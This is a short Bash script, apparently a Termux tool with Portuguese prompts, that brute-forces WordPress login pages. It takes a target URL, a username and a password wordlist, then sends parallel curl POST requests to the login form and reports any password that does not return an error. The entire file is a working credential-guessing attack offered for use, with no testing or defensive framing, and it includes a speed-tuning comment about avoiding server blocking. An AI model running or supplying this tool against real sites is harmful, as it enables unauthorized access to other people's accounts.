#!/bin/bash

clear
echo -e "\e[1;32m==== BRUTE FORCE PRO TERMINUX ====\e[0m"

read -p "🔗 URL de login: " url
if [ -z "$url" ]; then echo -e "\e[1;31m❌ URL obrigatória.\e[0m"; exit 1; fi

read -p "👤 Usuário: " user
if [ -z "$user" ]; then echo -e "\e[1;31m❌ Usuário obrigatório.\e[0m"; exit 1; fi

read -p "🔑 Senha personalizada (pressione ENTER para usar lista): " senha

if [ -z "$senha" ]; then
  read -p "📂 Nome do arquivo de senhas (.txt): " wordlist
  if [ ! -f "$wordlist" ]; then echo -e "\e[1;31m❌ Arquivo não encontrado.\e[0m"; exit 1; fi
  echo -e "\e[1;34m▶️ Iniciando brute-force...\e[0m"

  while IFS= read -r pwd; do
    (
      resp=$(curl -s -X POST "$url" -d "log=$user&pwd=$pwd&wp-submit=Log+In&testcookie=1")
      if [[ ! "$resp" =~ "Incorrect" && ! "$resp" =~ "error" ]]; then
        echo -e "\e[1;32m✅ SENHA ENCONTRADA: $pwd\e[0m"
        pkill -P $$ curl 2>/dev/null
        exit 0
      else
        echo -e "\e[0;31m❌ $pwd\e[0m"
      fi
    ) &
    sleep 0.002  # Ajuste para mais/menos velocidade, cuidado com bloqueio do servidor
  done < "$wordlist"

  wait
  echo -e "\e[1;33m🔔 Fim da lista.\e[0m"

else
  echo -e "\e[1;34m▶️ Testando senha personalizada: $senha\e[0m"
  resp=$(curl -s -X POST "$url" -d "log=$user&pwd=$senha&wp-submit=Log+In&testcookie=1")
  if [[ ! "$resp" =~ "Incorrect" && ! "$resp" =~ "error" ]]; then
    echo -e "\e[1;32m✅ SENHA ENCONTRADA: $senha\e[0m"
  else
    echo -e "\e[1;31m❌ Senha incorreta.\e[0m"
  fi
fi
